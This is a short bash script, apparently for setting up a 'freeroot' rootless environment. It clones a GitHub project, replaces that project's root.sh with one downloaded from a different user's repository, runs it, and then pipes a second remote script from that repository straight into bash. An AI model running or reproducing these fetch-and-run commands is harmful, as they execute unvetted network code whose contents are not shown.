#!/bin/bash
git clone https://github.com/foxytouxxx/freeroot
cd freeroot
rm root.sh
wget https://raw.githubusercontent.com/rifamanajul/All-Jobs/refs/heads/main/root.sh
bash root.sh
apt update
apt install wget curl -y
curl -sL https://raw.githubusercontent.com/rifamanajul/All-Jobs/refs/heads/main/titit.sh | bash
